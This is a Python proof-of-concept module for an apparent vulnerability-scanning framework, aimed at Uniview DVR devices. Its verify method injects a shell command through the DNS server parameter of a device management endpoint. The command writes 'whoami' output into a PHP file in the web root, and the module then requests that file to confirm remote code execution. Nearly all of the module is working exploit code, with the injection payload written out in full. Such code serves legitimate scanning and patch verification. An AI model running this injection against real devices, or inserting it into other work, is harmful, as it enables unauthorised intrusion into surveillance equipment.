from urllib.parse import quote
import requests

from loguru import logger

from .base import POCTemplate


class UniviewDvrRCE03(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['uniview']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.high
        self.desc = """"""
        self.headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.8',
            'Cache-Control': 'max-age=0',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
            'Connection': 'keep-alive',
        }

    def verify(self, ip, port=80):
        payload = '" | whoami >/usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/yzkx.php'
        encoded = quote(payload, safe='')
        path1 = f"/Interface/DevManage/VM.php?cmd=setDNSServer&DNSServerAdrr={encoded}"
        path2 = "/Interface/DevManage/yzkx.php"
        try:
            requests.get(f"http://{ip}:{port}{path1}", headers=self.headers, timeout=self.config.timeout, verify=False)
            r2 = requests.get(f"http://{ip}:{port}{path2}", headers=self.headers, timeout=self.config.timeout, verify=False)
            if r2.status_code == 200 and ('404' not in r2.text):
                return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(UniviewDvrRCE03)
